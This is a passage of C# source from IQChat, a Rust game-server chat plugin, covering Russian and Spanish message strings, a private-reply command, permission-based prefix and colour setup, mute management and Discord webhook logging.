                ["IQCHAT_TITLE_IGNORE_AND_MUTE_MUTED"] = "УПРАВЛЕНИЕ БЛОКИРОВКАМИ", 
                ["IQCHAT_TITLE_IGNORE_AND_MUTE_IGNORED"] = "УПРАВЛЕНИЕ ИГНОРИРОВАНИЕМ", 
                ["IQCHAT_TITLE_IGNORE_TITLES"] = "<b>ВЫ ДЕЙСТВИТЕЛЬНО ХОТИТЕ ИГНОРИРОВАТЬ\n{0}?</b>", 
                ["IQCHAT_TITLE_IGNORE_TITLES_UNLOCK"] = "<b>ВЫ ХОТИТЕ СНЯТЬ ИГНОРИРОВАНИЕ С ИГРОКА\n{0}?</b>", 
                ["IQCHAT_TITLE_IGNORE_BUTTON_YES"] = "<b>ДА, ХОЧУ</b>", 
                ["IQCHAT_TITLE_IGNORE_BUTTON_NO"] = "<b>НЕТ, ПЕРЕДУМАЛ</b>", 
                ["IQCHAT_TITLE_MODERATION_PANEL"] = "ПАНЕЛЬ МОДЕРАТОРА",

                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU"] = "Управление блокировками",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT"] = "ВЫБЕРИТЕ ДЕЙСТВИЕ",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_REASON"] = "ВЫБЕРИТЕ ПРИЧИНУ БЛОКИРОВКИ",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_CHAT"] = "Заблокировать чат",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_VOICE"] = "Заблокировать голос",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_CHAT"] = "Разблокировать чат",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_VOICE"] = "Разблокировать голос",
                ["IQCHAT_BUTTON_MODERATION_MUTE_ALL_CHAT"] = "Заблокировать всем чат",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_CHAT"] = "Разблокировать всем чат",
                ["IQCHAT_BUTTON_MODERATION_MUTE_ALL_VOICE"] = "Заблокировать всем голос",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_VOICE"] = "Разблокировать всем голос",

                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED"] = "У вас имеется активная блокировка чата : {0}",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_CHAT"] = "Администратор заблокировал всем чат. Ожидайте полной разблокировки",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_VOICE"] = "Администратор заблокировал всем голосоввой чат. Ожидайте полной разблокировки",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_UMMUTED_ALL_VOICE"] = "Администратор разрблокировал всем голосоввой чат",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_UNMUTED_ALL_CHAT"] = "Администратор разрблокировал всем чат",

                ["IQCHAT_FUNCED_ALERT_TITLE"] = "<color=#a7f64f><b>[УПОМИНАНИЕ]</b></color>",
                ["IQCHAT_FUNCED_ALERT_TITLE_ISMUTED"] = "Игрок уже был замучен!",
                ["IQCHAT_FUNCED_ALERT_TITLE_SERVER"] = "Администратор",

                ["IQCHAT_INFO_ONLINE"] = "Сейчас на сервере :\n{0}",

                ["IQCHAT_INFO_ANTI_NOOB"] = "Вы впервые подключились на сервер!\nОтыграйте еще {0}\nЧтобы получить доступ к отправке сообщений в глобальный и командный чат!",
                ["IQCHAT_INFO_ANTI_NOOB_PM"] = "Вы впервые подключились на сервер!\nОтыграйте еще {0}\nЧтобы получить доступ к отправке сообщений в личные сообщения!",
                
                ["XLEVELS_SYNTAX_PREFIX"] = "[{0} Level]",
                ["CLANS_SYNTAX_PREFIX"] = "[{0}]",

            }, this, "ru");

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["FUNC_MESSAGE_MUTE_CHAT"] = "{0} silenciado {1}\n Duración: {2}\nRazón: {3}",
                ["FUNC_MESSAGE_UNMUTE_CHAT"] = "{0} sin silenciar {1}",
                ["FUNC_MESSAGE_MUTE_VOICE"] = "{0} voz apagada a {1}\n Duracion : {2}\n Razon : {3}",
                ["FUNC_MESSAGE_UNMUTE_VOICE"] = "{0} voz no silenciada a {1}",
                ["FUNC_MESSAGE_MUTE_ALL_CHAT"] = "Chat desactivado",
                ["FUNC_MESSAGE_UNMUTE_ALL_CHAT"] = "Chat habilitado",
                ["FUNC_MESSAGE_MUTE_ALL_VOICE"] = "Chat de voz desactivado",
                ["FUNC_MESSAGE_UNMUTE_ALL_VOICE"] = "Chat de voz habilitado",
                ["FUNC_MESSAGE_MUTE_ALL_ALERT"] = "Bloqueo por parte del administrador",
                ["FUNC_MESSAGE_PM_TURN_FALSE"] = "El jugador tiene prohibido enviarse mensajes privados",
                ["FUNC_MESSAGE_ALERT_TURN_FALSE"] = "El jugador no ha podido notificarse a sí mismo",
                ["FUNC_MESSAGE_NO_ARG_BROADCAST"] = "No se puede enviar un mensaje vacío.",
                ["UI_ALERT_TITLE"] = "<size=14><b>Notificación</b></size>",
                ["COMMAND_NOT_PERMISSION"] = "No tienes permisos para usar este comando",
                ["COMMAND_RENAME_NOTARG"] = "Para renombrar utilice : /rename [NewNickname] [NewID (Optional)]",
                ["COMMAND_RENAME_NOT_ID"] = "¡ID incorrecto para renombrar! Utilice Steam64ID o déjelo en blanco",
                ["COMMAND_RENAME_SUCCES"] = "Has cambiado con éxito tu nombre de usuario. \n Tu nombre de usuario: {0}. \nTu ID: {1}.",
                ["COMMAND_PM_NOTARG"] = "Para enviar pm utilice : /pm [Nombre] [Mensaje]",
                ["COMMAND_PM_NOT_NULL_MSG"] = "¡El mensaje está vacío!",
                ["COMMAND_PM_NOT_USER"] = "Usuario no encontrado o desconectado",
                ["COMMAND_PM_SUCCESS"] = "Su mensaje privado enviado con éxito \n Mensage : {0}\n : Entregado{1}",
                ["COMMAND_PM_SEND_MSG"] = "Mensaje de {0}\n{1}",
                ["COMMAND_R_NOTARG"] = "Para responder utilice : /r Mensaje",
                ["COMMAND_R_NOTMSG"] = "Todavía no tienes ninguna conversación privada.",
                ["FLOODERS_MESSAGE"] = "¡Estás escribiendo demasiado rápido! Por favor, espere {0} segundos",
                ["PREFIX_SETUP"] = "Has eliminado con éxito el prefijo {0}.",
                ["COLOR_CHAT_SETUP"] = "Has obtenido un nuevo color en el chat",
                ["COLOR_NICK_SETUP"] = "Has cambiado tu nick correctamente del chat",
                ["PREFIX_RETURNRED"] = "Su prefijo {0} ha caducado, se ha restablecido automáticamente",
                ["COLOR_CHAT_RETURNRED"] = "Acción de su <color={0}>color de chat</color> más, se restablece automáticamente",
                ["COLOR_NICK_RETURNRED"] = "Acción de su <color={0}>color nick</color> sobre, se restablece automáticamente",
                ["WELCOME_PLAYER"] = "{0} Se ha conectado",
                ["LEAVE_PLAYER"] = "{0} izquierda",
                ["WELCOME_PLAYER_WORLD"] = "{0} Se ha conectado del Pais: {1}",
                ["LEAVE_PLAYER_REASON"] = "{0} Se ha desconectado. Razon: {1}",
                ["IGNORE_ON_PLAYER"] = "Has añadido {0} en la lista negra",
                ["IGNORE_OFF_PLAYER"] = "Has eliminado el jugador {0} de la lista negra",
                ["IGNORE_NO_PM"] = "Este jugador te ha añadido a la lista negra. Su mensaje no ha sido entregado.",
                ["IGNORE_NO_PM_ME"] = "Has añadido a este jugador en la lista negra. Su mensaje no ha sido entregado.",
                ["INGORE_NOTARG"] = "Para ignorar a un jugador utiliza : /ignore nickname",
                ["DISCORD_SEND_LOG_CHAT"] = "JUgador : {0}({1})\nMensaje filtrado : {2}\nMensages : {3}",
                ["DISCORD_SEND_LOG_MUTE"] = "{0}({1}) give mute chat\nSuspect : {2}({3})\nReason : {4}",
                ["TITLE_FORMAT_DAYS"] = "D",
                ["TITLE_FORMAT_HOURSE"] = "H",
                ["TITLE_FORMAT_MINUTES"] = "M",
                ["TITLE_FORMAT_SECONDS"] = "S",
                ["IQCHAT_CONTEXT_TITLE"] = "ESTABLECER UN CHAT",
                ["IQCHAT_CONTEXT_SETTING_ELEMENT_TITLE"] = "AJUSTE PERSONALIZADO",
                ["IQCHAT_CONTEXT_INFORMATION_TITLE"] = "INFORMACIÓN",
                ["IQCHAT_CONTEXT_SETTINGS_TITLE"] = "AJUSTES",
                ["IQCHAT_CONTEXT_SETTINGS_PM_TITLE"] = "Mensajes privados",
                ["IQCHAT_CONTEXT_SETTINGS_ALERT_TITLE"] = "Notificación en el chat",
                ["IQCHAT_CONTEXT_SETTINGS_ALERT_PM_TITLE"] = "Mención en el chat",
                ["IQCHAT_CONTEXT_SETTINGS_SOUNDS_TITLE"] = "Notificación sonora",
                ["IQCHAT_CONTEXT_MUTE_STATUS_NOT"] = "NO",
                ["IQCHAT_CONTEXT_MUTE_STATUS_TITLE"] = "Bloqueo del chat",
                ["IQCHAT_CONTEXT_IGNORED_STATUS_COUNT"] = "<size=11>{0}</size> humano (а)",
                ["IQCHAT_CONTEXT_IGNORED_STATUS_TITLE"] = "Ignorando",
                ["IQCHAT_CONTEXT_NICK_DISPLAY_TITLE"] = "Su apodo",
                ["IQCHAT_CONTEXT_NICK_DISPLAY_MESSAGE"] = "Me encanta Zoxiland",
                ["IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE"] = "Prefijo",
                ["IQCHAT_CONTEXT_SLIDER_NICK_COLOR_TITLE"] = "Nick",
                ["IQCHAT_CONTEXT_SLIDER_MESSAGE_COLOR_TITLE"] = "Mensaje",
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE"] = "Rango",
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_NULLER"] = "Ausente",
                ["IQCHAT_CONTEXT_SLIDER_PREFIX_TITLE_DESCRIPTION"] = "Elegir un prefijo",
                ["IQCHAT_CONTEXT_SLIDER_CHAT_NICK_TITLE_DESCRIPTION"] = "Elegir un color de apodo",
                ["IQCHAT_CONTEXT_SLIDER_CHAT_MESSAGE_TITLE_DESCRIPTION"] = "Selección del color del chat",
                ["IQCHAT_CONTEXT_SLIDER_IQRANK_TITLE_DESCRIPTION"] = "Selección de rangos",
                ["IQCHAT_CONTEXT_DESCRIPTION_PREFIX"] = "Ajuste del prefijo",
                ["IQCHAT_CONTEXT_DESCRIPTION_NICK"] = "Configurar un apodo",
                ["IQCHAT_CONTEXT_DESCRIPTION_CHAT"] = "Configurar un mensaje",
                ["IQCHAT_CONTEXT_DESCRIPTION_RANK"] = "Establecimiento del rango",
                ["IQCHAT_ALERT_TITLE"] = "ALERTA",
                ["IQCHAT_TITLE_IGNORE_AND_MUTE_MUTED"] = "GESTIÓN MUTEADOS",
                ["IQCHAT_TITLE_IGNORE_AND_MUTE_IGNORED"] = "GESTIÓN IGNORE",
                ["IQCHAT_TITLE_IGNORE_TITLES"] = "<b>¿REALMENTE QUIERES IGNORAR\n{0}?</b>",
                ["IQCHAT_TITLE_IGNORE_TITLES_UNLOCK"] = "<b>¿QUIERES QUITARLE AL JUGADOR LO DE IGNORAR?\n{0}?</b>",
                ["IQCHAT_TITLE_IGNORE_BUTTON_YES"] = "<b>SÍ, QUIERO</b>",
                ["IQCHAT_TITLE_IGNORE_BUTTON_NO"] = "<b>NO, HE CAMBIADO DE OPINIÓN</b>",
                ["IQCHAT_TITLE_MODERATION_PANEL"] = "PANEL DE MODERADORES",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU"] = "Menu de muteados",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT"] = "SELECCIONE UNA ACCIÓN",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_REASON"] = "SELECCIONE EL MOTIVO DEL BLOQUEO",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_CHAT"] = "Bloquear el Chat",
                ["IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_VOICE"] = "Bloquear Voz",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_CHAT"] = "Desbloquear Chat",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_MENU_TITLE_ALERT_VOICE"] = "Desbloquear Voz",
                ["IQCHAT_BUTTON_MODERATION_MUTE_ALL_CHAT"] = "Bloquear todos los chats",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_CHAT"] = "Desbloquear todo el chat",
                ["IQCHAT_BUTTON_MODERATION_MUTE_ALL_VOICE"] = "Bloquear la voz de todos",
                ["IQCHAT_BUTTON_MODERATION_UNMUTE_ALL_VOICE"] = "Desbloquear la voz de todos",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED"] = "Tienes un bloqueo de chat activo : {0}",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_CHAT"] = "El administrador ha bloqueado el chat. Espera el desbloqueo completo",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_MUTED_ALL_VOICE"] = "El administrador ha bloqueado el chat de voz. Espera el desbloqueo completo",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_UMMUTED_ALL_VOICE"] = "El administrador ha desbloqueado el chat de voz.",
                ["IQCHAT_FUNCED_NO_SEND_CHAT_UNMUTED_ALL_CHAT"] = "El administrador ha desbloqueado el chat",
                ["IQCHAT_FUNCED_ALERT_TITLE"] = "<color=#a7f64f><b>[MENCIÓN]</b></color>",
                ["IQCHAT_FUNCED_ALERT_TITLE_ISMUTED"] = "El jugador ya ha sido silenciado.",
                ["IQCHAT_FUNCED_ALERT_TITLE_SERVER"] = "Administrador",
                ["IQCHAT_INFO_ONLINE"] = "Now on the server :\n{0}",
                ["IQCHAT_INFO_ANTI_NOOB"] = "Tienes que jugar un poco mas para poder hablar por el chat {0}.",
                ["IQCHAT_INFO_ANTI_NOOB_PM"] = "No puedes enviar un privado por que es un jugador nuevo.",
                ["XLEVELS_SYNTAX_PREFIX"] = "[{0} Level]", 
                ["CLANS_SYNTAX_PREFIX"] = "[{0}]",

            }, this, "es-ES");
           
            PrintWarning(LanguageEn ? "Language file uploaded successfully" : "Языковой файл загружен успешно");
        }
        public Dictionary<BasePlayer, BasePlayer> PMHistory = new Dictionary<BasePlayer, BasePlayer>();
		   		 		  						  	   		  	  			  	  			  	   		  		  
        private const String PermissionHideOnline = "iqchat.onlinehide";

        [ChatCommand("r")]
        void RChat(BasePlayer Sender, string cmd, string[] arg)
        {
            Configuration.ControllerMessage ControllerMessages = config.ControllerMessages;
            if (!ControllerMessages.TurnedFunc.PMSetting.PMActivate) return;

            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(Sender, GetLang("COMMAND_R_NOTARG", Sender.UserIDString));
                return;
            }

            Configuration.ControllerMessage.TurnedFuncional.AntiNoob.Settings antiNoob = config.ControllerMessages.TurnedFunc.AntiNoobSetting.AntiNoobPM;
            if (antiNoob.AntiNoobActivate)
                if (IsNoob(Sender.userID, antiNoob.TimeBlocked))
                {
                    ReplySystem(Sender, GetLang("IQCHAT_INFO_ANTI_NOOB_PM", Sender.UserIDString, FormatTime(UserInformationConnection[Sender.userID].LeftTime(antiNoob.TimeBlocked), Sender.UserIDString)));
                    return;
                }

            if (!PMHistory.ContainsKey(Sender))
            {
                ReplySystem(Sender, GetLang("COMMAND_R_NOTMSG", Sender.UserIDString));
                return;
            }

            BasePlayer RetargetUser = PMHistory[Sender];
            if (RetargetUser == null)
            {
                ReplySystem(Sender, GetLang("COMMAND_PM_NOT_USER", Sender.UserIDString));
                return;
            }

            User InfoRetarget = UserInformation[RetargetUser.userID];
            User InfoSender = UserInformation[RetargetUser.userID];

            if (!InfoRetarget.Settings.TurnPM)
            {
                ReplySystem(Sender, GetLang("FUNC_MESSAGE_PM_TURN_FALSE", Sender.UserIDString));
                return;
            }
            if (ControllerMessages.TurnedFunc.IgnoreUsePM)
            {
                if (InfoRetarget.Settings.IsIgnored(Sender.userID))
                {
                    ReplySystem(Sender, GetLang("IGNORE_NO_PM", Sender.UserIDString));
                    return;
                }
                if (InfoSender.Settings.IsIgnored(RetargetUser.userID))
                {
                    ReplySystem(Sender, GetLang("IGNORE_NO_PM_ME", Sender.UserIDString));
                    return;
                }
            }
            
            String Message = GetMessageInArgs(Sender, arg);
            if (Message == null || Message.Length <= 0)
            {
                ReplySystem(Sender, GetLang("COMMAND_PM_NOT_NULL_MSG", Sender.UserIDString));
                return;
            }
            if (Message.Length > 125) return;
            Message = Message.EscapeRichText();

            PMHistory[RetargetUser] = Sender;

            GeneralInformation.RenameInfo RenameSender = GeneralInfo.GetInfoRename(Sender.userID);
            GeneralInformation.RenameInfo RenamerTarget = GeneralInfo.GetInfoRename(RetargetUser.userID);
            String DisplayNameSender = RenameSender!= null? RenameSender.RenameNick ?? Sender.displayName : Sender.displayName;
            String TargetDisplayName = RenamerTarget != null ? RenamerTarget.RenameNick ?? RetargetUser.displayName : RetargetUser.displayName;

            ReplySystem(RetargetUser, GetLang("COMMAND_PM_SEND_MSG", RetargetUser.UserIDString, DisplayNameSender, Message));
            ReplySystem(Sender, GetLang("COMMAND_PM_SUCCESS", Sender.UserIDString, Message, TargetDisplayName));

            if (InfoRetarget.Settings.TurnSound)
                Effect.server.Run(ControllerMessages.TurnedFunc.PMSetting.SoundPM, RetargetUser.GetNetworkPosition());

            Log(LanguageEn ? $"PRIVATE MESSAGES : {Sender.displayName} sent a message to the player - {RetargetUser.displayName}\nMESSAGE : {Message}" : $"ЛИЧНЫЕ СООБЩЕНИЯ : {Sender.displayName} отправил сообщение игроку - {RetargetUser.displayName}\nСООБЩЕНИЕ : {Message}");
            DiscordLoggPM(Sender, RetargetUser, Message);

            RCon.Broadcast(RCon.LogType.Chat, new Chat.ChatEntry
            {
                Message = LanguageEn ? $"PRIVATE MESSAGES : {Sender.displayName}({Sender.userID}) -> {RetargetUser.displayName} : MESSAGE : {Message}" : $"ЛИЧНЫЕ СООБЩЕНИЯ : {Sender.displayName}({Sender.userID}) -> {RetargetUser.displayName} : СООБЩЕНИЕ : {Message}",
                UserId = Sender.UserIDString,
                Username = Sender.displayName,
                Channel = Chat.ChatChannel.Global,
                Time = (DateTime.UtcNow.Hour * 3600) + (DateTime.UtcNow.Minute * 60),
                Color = "#3f4bb8",
            });
            PrintWarning(LanguageEn ? $"PRIVATE MESSAGES : {Sender.displayName}({Sender.userID}) -> {RetargetUser.displayName} : MESSAGE : {Message}" : $"ЛИЧНЫЕ СООБЩЕНИЯ : {Sender.displayName}({Sender.userID}) -> {RetargetUser.displayName} : СООБЩЕНИЕ : {Message}");
        }
		   		 		  						  	   		  	  			  	  			  	   		  		  
        
                void OnGroupPermissionGranted(string name, string perm)
        {
            String[] PlayerGroups = permission.GetUsersInGroup(name);
            if (PlayerGroups == null) return;

            foreach (String playerInfo in PlayerGroups)
            {
                BasePlayer player = BasePlayer.FindByID(UInt64.Parse(playerInfo.Substring(0,17)));
                if (player == null) return;

                SetupParametres(player.UserIDString, perm);
            }
        }

        
                void OnUserPermissionGranted(string id, string permName) => SetupParametres(id, permName);
        
        private void DrawUI_IQChat_Mute_And_Ignore(BasePlayer player, SelectedAction Action) 
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_And_Ignore");
            if (Interface == null) return;

            Interface = Interface.Replace("%TITLE%", Action == SelectedAction.Mute ? GetLang("IQCHAT_TITLE_IGNORE_AND_MUTE_MUTED", player.UserIDString) : GetLang("IQCHAT_TITLE_IGNORE_AND_MUTE_IGNORED", player.UserIDString));
            Interface = Interface.Replace("%ACTION_TYPE%", $"{Action}");

            CuiHelper.DestroyUi(player, "MuteAndIgnoredPanel");
            CuiHelper.AddUi(player, Interface);

            DrawUI_IQChat_Mute_And_Ignore_Player_Panel(player, Action);
        }      
        private class InformationOpenedUI
        {
            public List<Configuration.ControllerParameters.AdvancedFuncion> ElementsPrefix;
            public List<Configuration.ControllerParameters.AdvancedFuncion> ElementsNick;
            public List<Configuration.ControllerParameters.AdvancedFuncion> ElementsChat;
            public List<Configuration.ControllerParameters.AdvancedFuncion> ElementsRanks;
            public Int32 SlideIndexPrefix = 0;
            public Int32 SlideIndexNick = 0;
            public Int32 SlideIndexChat = 0;
            public Int32 SlideIndexRank = 0;
        }
        String API_GET_PREFIX(UInt64 ID)
        {
            if (!UserInformation.ContainsKey(ID)) return String.Empty;
            Configuration.ControllerParameters ControllerParameter = config.ControllerParameter;

            User Info = UserInformation[ID];
            String Prefixes = String.Empty;
		   		 		  						  	   		  	  			  	  			  	   		  		  
            if (ControllerParameter.Prefixes.TurnMultiPrefixes)
                Prefixes = String.Join("", Info.Info.PrefixList.Take(ControllerParameter.Prefixes.MaximumMultiPrefixCount));
            else Prefixes = Info.Info.Prefix;

            return Prefixes;
        }

        
        
        private void SetupParametres(String ID, String Permissions)
        {
            UInt64 UserID = UInt64.Parse(ID);
            BasePlayer player = BasePlayer.FindByID(UserID);

            Configuration.ControllerConnection.Turned Controller = config.ControllerConnect.Turneds;
            Configuration.ControllerParameters Parameters = config.ControllerParameter;

            if (!UserInformation.ContainsKey(UserID)) return;
            User Info = UserInformation[UserID];

            if (Controller.TurnAutoSetupPrefix)
            {
                Configuration.ControllerParameters.AdvancedFuncion Prefixes = Parameters.Prefixes.Prefixes.FirstOrDefault(prefix => prefix.Permissions == Permissions);
                if (Prefixes == null) return;

                if (Parameters.Prefixes.TurnMultiPrefixes)
                    Info.Info.PrefixList.Add(Prefixes.Argument);
                else Info.Info.Prefix = Prefixes.Argument;

                if (player != null)
                    ReplySystem(player, GetLang("PREFIX_SETUP", player.UserIDString, Prefixes.Argument));

                Log(LanguageEn ? $"Player ({UserID}) successfully retrieved the prefix {Prefixes.Argument}" : $"Игрок ({UserID}) успешно забрал префикс {Prefixes.Argument}");
            }
            if (Controller.TurnAutoSetupColorNick)
            {
                Configuration.ControllerParameters.AdvancedFuncion ColorNick = Parameters.NickColorList.FirstOrDefault(nick => nick.Permissions == Permissions);
                if (ColorNick == null) return;
                Info.Info.ColorNick = ColorNick.Argument;

                if (player != null)
                    ReplySystem(player, GetLang("COLOR_NICK_SETUP", player.UserIDString, ColorNick.Argument));

                Log(LanguageEn ? $"Player ({UserID}) successfully took the color of the nickname {ColorNick.Argument}" : $"Игрок ({UserID}) успешно забрал цвет ника {ColorNick.Argument}");
            }
            if (Controller.TurnAutoSetupColorChat)
            {
                Configuration.ControllerParameters.AdvancedFuncion ColorChat = Parameters.MessageColorList.FirstOrDefault(message => message.Permissions == Permissions);
                if (ColorChat == null) return;
                Info.Info.ColorMessage = ColorChat.Argument;

                if (player != null)
                    ReplySystem(player, GetLang("COLOR_CHAT_SETUP", player.UserIDString, ColorChat.Argument));

                Log(LanguageEn ? $"Player ({UserID}) successfully retrieved the color of the chat {ColorChat.Argument}" : $"Игрок ({UserID}) успешно забрал цвет чата {ColorChat.Argument}");
            }
        }
        private enum SelectedParametres
        {
            DropList,
            Slider
        }

        public string FindFakeName(ulong userID) => (string)IQFakeActive?.Call("FindFakeName", userID);

        private void Request(string url, string payload, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            webrequest.Enqueue(url, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds = float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning($" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning($"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }
                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex) { }

            }, this, RequestMethod.POST, header);
        }
        void Alert(BasePlayer Sender, BasePlayer Recipient, string[] arg)
        {
            String Message = GetMessageInArgs(Sender, arg);
            if (Message == null) return;

            ReplySystem(Recipient, Message);
        }
        
        
                private void Log(String LoggedMessage) => LogToFile("IQChatLogs", LoggedMessage, this);
        private const String PermissionHideConnection = "iqchat.hideconnection";
        
        
        [ChatCommand("chat")]
        private void ChatCommandOpenedUI(BasePlayer player)
        {
            if(_interface == null)
            {
                PrintWarning(LanguageEn ? "We generate the interface, wait for a message about successful generation" : "Генерируем интерфейс, ожидайте сообщения об успешной генерации");
                return;
            }
            if (player == null) return;

            User Info = UserInformation[player.userID];
            Configuration.ControllerParameters ControllerParameters = config.ControllerParameter;

            if (!LocalBase.ContainsKey(player))
                LocalBase.Add(player, new InformationOpenedUI { });

            LocalBase[player].ElementsPrefix = ControllerParameters.Prefixes.Prefixes.OrderByDescending(arg => arg.Argument.Length).Where(p => permission.UserHasPermission(player.UserIDString, p.Permissions)).ToList();
            LocalBase[player].ElementsNick = ControllerParameters.NickColorList.Where(n => permission.UserHasPermission(player.UserIDString, n.Permissions)).ToList();
            LocalBase[player].ElementsChat = ControllerParameters.MessageColorList.Where(m => permission.UserHasPermission(player.UserIDString, m.Permissions)).ToList();
            
            if (IQRankSystem && config.ReferenceSetting.IQRankSystems.UseRankSystem)
            {
                List<Configuration.ControllerParameters.AdvancedFuncion> RankList = new List<Configuration.ControllerParameters.AdvancedFuncion>();
                foreach(String Rank in IQRankListKey(player.userID))
                    RankList.Add(new Configuration.ControllerParameters.AdvancedFuncion { Argument = Rank, Permissions = String.Empty });

                LocalBase[player].ElementsRanks = RankList;
            }

            DrawUI_IQChat_Context(player);
        }
        private void DrawUI_IQChat_Mute_Alert_Reasons(BasePlayer player, BasePlayer Target, MuteType Type, UInt64 IDFake = 0)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_Alert_DropList_Title");
            if (Interface == null) return;
    
            Interface = Interface.Replace("%TITLE%", GetLang("IQCHAT_BUTTON_MODERATION_MUTE_MENU_TITLE_ALERT_REASON", player.UserIDString));

            CuiHelper.DestroyUi(player, "AlertMuteTitleReason");
            CuiHelper.DestroyUi(player, "PanelMuteReason");
            CuiHelper.AddUi(player, Interface);

            List<Configuration.ControllerMute.Muted> Reasons = Type == MuteType.Chat ? config.ControllerMutes.MuteChatReasons : config.ControllerMutes.MuteVoiceReasons;

            Int32 Y = 0;
            foreach(Configuration.ControllerMute.Muted Reason in Reasons.Take(6))
                DrawUI_IQChat_Mute_Alert_Reasons(player, Target, Reason.Reason, Y++, Type, IDFake);
        }
        private void DrawUI_IQChat_Mute_And_Ignore_Pages(BasePlayer player, Boolean IsNextPage, SelectedAction Action, Int32 Page = 0) 
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_Mute_And_Ignore_Pages");  
            if (Interface == null) return;

            String CommandRight = IsNextPage ? $"newui.cmd action.mute.ignore page.controller {Action} {Page + 1}" : String.Empty;
            String ColorRight = String.IsNullOrEmpty(CommandRight) ? "1 1 1 0.1" : "1 1 1 1";

            String CommandLeft = Page > 0 ? $"newui.cmd action.mute.ignore page.controller {Action} {Page - 1}" : String.Empty;
            String ColorLeft = String.IsNullOrEmpty(CommandLeft) ? "1 1 1 0.1" : "1 1 1 1";

            Interface = Interface.Replace("%COMMAND_LEFT%", CommandLeft); 
            Interface = Interface.Replace("%COMMAND_RIGHT%", CommandRight);
            Interface = Interface.Replace("%PAGE%", $"{Page}");
            Interface = Interface.Replace("%COLOR_LEFT%", ColorLeft);
            Interface = Interface.Replace("%COLOR_RIGHT%", ColorRight);

            CuiHelper.DestroyUi(player, "PageCount");
            CuiHelper.DestroyUi(player, "LeftPage");
            CuiHelper.DestroyUi(player, "RightPage");
            CuiHelper.AddUi(player, Interface);
        }

        [ConsoleCommand("unmute")]
        void UnMuteCustomAdmin(ConsoleSystem.Arg arg)
        {
            if (arg.Player() != null)
                if (!permission.UserHasPermission(arg.Player().UserIDString, PermissionMute)) return;
            
            if (arg?.Args == null || arg.Args.Length != 1 || arg.Args.Length > 1)
            {
                PrintWarning(LanguageEn ? "Invalid syntax, please use : unmute Steam64ID" : "Неверный синтаксис,используйте : unmute Steam64ID");
                return;
            }

            string NameOrID = arg.Args[0];
            BasePlayer target = GetPlayerNickOrID(NameOrID);

            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (!Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            ConsoleOrPrintMessage(arg.Player(),
                                LanguageEn ?"The player does not have a chat lock" : "У игрока нет блокировки чата");
                            return;
                        }
                        
                        Info.MuteInfo.UnMute(MuteType.Chat);
                        
                        ConsoleOrPrintMessage(arg.Player(),
                            LanguageEn ? "You have unblocked the offline chat to the player" : "Вы разблокировали чат offline игроку");
                        return;
                    }
                    else
                    {
                        ConsoleOrPrintMessage(arg.Player(),
                            LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    ConsoleOrPrintMessage(arg.Player(),
                        LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }
            
            UnmutePlayer(target, MuteType.Chat, arg.Player(), false, true);
            Puts(LanguageEn ? "Successfully" : "Успешно");
        }

        
                void ReplyChat(Chat.ChatChannel channel, BasePlayer player, String OutMessage)
        {
            Configuration.ControllerMessage ControllerMessages = config.ControllerMessages;

            User Info = UserInformation[player.userID];
            GeneralInformation.RenameInfo RenameInfo = GeneralInfo.GetInfoRename(player.userID);
            UInt64 RenameID = RenameInfo != null ? RenameInfo.RenameID != 0 ? RenameInfo.RenameID : player.userID : player.userID;
